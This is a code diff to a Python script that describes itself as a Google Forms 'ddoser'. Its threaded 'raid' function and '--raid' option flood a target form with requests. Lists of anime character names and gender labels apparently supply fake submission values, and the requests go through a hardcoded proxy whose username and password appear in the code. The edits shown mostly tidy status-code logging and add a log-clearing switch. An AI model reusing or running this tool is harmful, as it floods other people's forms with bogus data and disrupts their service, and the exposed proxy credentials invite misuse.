@@ -11,8 +11,12 @@ import requests
 LogManager = LogManager()
 import threading
 import click
+
 import os
 import json
+import re
+
+from http.client import responses
 
 proxies = {"https":"https://cool-leaf-5479p1000:QAKyMxtT@167.99.195.184:5050"}
 
@@ -46,31 +50,24 @@ def Response(a, *args, **kwargs):
             
     if a == "headers":
         LogManager.info(resp.headers)
-    elif a == "content":                        
+    elif a == "content":                                                                
         LogManager.info(resp.content)
         
 def StatusCode(*args, **kwargs):
     if len(args) != 0:
-        resp = requests.get(erase(args[0], 0))
+        r = requests.get(erase(args[0], 0))
     else:
-        resp = requests.get(_link)
-    res = resp.status_code
+        r = requests.get(_link)
     
-    if res == 200:
-        s = "OK"
-        LogManager.info(f"[{res}] {s}")   
-    elif res == 429:
-        s = "TooManyRequests"
-        LogManager.warning(f"[{res}] {s}")
-    elif res == 405:
-        s = "MethotNotAllowed"
-        LogManager.warning(f"[{res}] {s}")
-    elif res == 404:
-        s = "NotFound -- MayBePrivate"
-        LogManager.error(f"[{res}] {s}") 
-    else:
-        s = "Undefined"
-        LogManager.error(f"[{res}] {s}")
+        if r.status_code == 200:
+            status = "OK"
+            LogManager.info(f"{r} === {status}")
+        elif r.status_code == 405 or r.status_code == 404 or r.status_code == 429:
+            status = responses[r.status_code]
+            LogManager.warning(f"{r} === {status}")
+        else:
+            status = responses[r.status_code]
+            LogManager.error(f"{r} === {status}")
 
 try:
     respG = open("inf.txt", "r", encoding="utf-8").readline()
@@ -131,24 +128,13 @@ def raid(a, b, c, d, e:int):
         if r.status_code == 200:
             status = "OK"
             LogManager.info(f"{thr} === {r} === {e + 1} === {status}")
-        elif r.status_code == 429:
-            status ="TooManyRequests"
+        elif r.status_code == 405 or r.status_code == 404 or r.status_code == 429:
+            status = responses[r.status_code]
             LogManager.warning(f"{thr} === {r} === {e + 1} === {status}")
-        elif r.status_code == 405:
-            status = "MethodNotAllowed"
-            LogManager.warning(f"{thr} === {r} === {e + 1} === {status}")
-        elif r.status_code == 404:
-            status = "NotFound"
-            LogManager.error(f"{thr} === {r} === {e + 1} === {status}")
-        elif r.status_code == 400:
-            status = "BadRequest"
-            LogManager.error(f"{thr} === {r} === {e + 1} === {status}")
         else:
-            status = "Undefined"
+            status = responses[r.status_code]
             LogManager.error(f"{thr} === {r} === {e + 1} === {status}")
-            
-    pass
-            
+                        
 rand_list = ["Yuno", "Ayumu Kasuga Osaka", "Kiri Komori", "Asuka Soryu Langley", "Kotonoha Katsura", "Machi", "Rika Furude", "Ai Enma", "Nausicaä", "Yoko Littner", "Hitagi Senjougahara", "Ika Musume", "Rena Ryuuguu", "Anna Kurauchi", "Miyako", "Poplar Taneshima", "Akira Amatsume", "Himeko Katagiri", "Suiseiseki", "Hitoha Marui", "Ayumu Nishizawa", "Nadeko Sengoku", "Lum", "Aono Morimiya", "Shion Fujino", "Shiki Ryougi", "Lina Inverse", "Aoi Yamada", "Haruko Haruhara", "Yuki Nagato", "Kaede Fuyou", "Chiri Kitsu", "Ayumi Yamada", "Misaki Nakahara", "Megumi Noda", "Hanyuu Furude", "Kafuka Fuura", "Faye Valentine", "Tomoko Kuroki", "Tamaki Kawazoe", "Kino", "Ayu Tsukimiya", "Mion Sonozaki", "Excel", "Fuuko Ibuki", "Rin Kaga", "Kou", "Celty Sturluson", "Ana Coppola", "Nino", "Sayoko Kurosaki",
              "Tsukasa Hiiragi", "Guchuko", "Sun Seto", "Shouko Kirishima", "Balalaika", "Ukyo Kuonji", "Aika Granzchesta", "Nobue Itoh", "Rebecca Miyamoto", "Alice Carroll", "Isumi Saginomiya", "Ichijou", "Chizuru Minamoto", "Chiaki Minami", "Suigintou", "Marii Buratei", "Nano Shinonome", "Akari Akaza", "Murasaki Kuhouin", "Horo", "Konata Izumi", "Riza Hawkeye", "Sora Kajiwara", "Himeko Inaba", "Dorm Leader", "Risa Koizumi", "Sakaki", "Futaba Marui", "Satsuki Kitaoji", "Nori", "Nagisa Furukawa", "Mahoro Andou", "Rakka", "Chihiro Shindou", "Rei Ayanami", "Haruhi Fujioka", "Yuuko Ichihara", "Mai Kawasumi", "Maki Umezaki", "Tsuyuri", "Kana Minami", "Tsumugi Kotobuki", "Mamimi Samejima", "Olivier Mira Armstrong", "Nanami Aoyama", "Kuro Kagami", "Mashiro Shiina", "Yakumo Tsukamoto", "Matsurika Shinouji"]
 
@@ -160,9 +146,10 @@ genders = ['Agender', 'Androgyne', 'Androgynous', 'Bigender', 'Cis', 'FTM', 'Gen
 
 @click.command()
 @click.option('--link', default = True, help = 'Show raiding link')
-@click.option('--raid', default = 3, help = 'Start ddos')
-@click.option('--resp', default = "text", help = "Get response")
-def starter(link, resp, raid):                                              
+@click.option('--raid', default = 3, help = 'Start ddos any google form`s link')
+@click.option('--resp', default = "text", help = "Get response || Post response")
+@click.option('--log', default = "jojo", help = "Any actions with logs")
+def starter(link, resp, raid, log):                                              
     
     """Google Form`s ddoser script`s help`s command:\\//"""
     
@@ -182,12 +169,15 @@ def starter(link, resp, raid):
             StatusCode(resp[6:])
         if "set_input" in resp and len(resp) != 9:
             SetInput(resp[10:])
-        if resp == "get_input":
+        if resp == "get_input":                                 
             GetInput()
         if resp == "set_input":
             SetInput(_link);
         if resp == "status":
             StatusCode()
+        if log == "cls":
+            with open("LogPython_info.log", "w") as log_file:
+                log_file.write(" ")
         if raid == 1:
 
             print('\033[36m' + '          _____                    _____                    _____                    _____                    _____                    _____     _____  ')
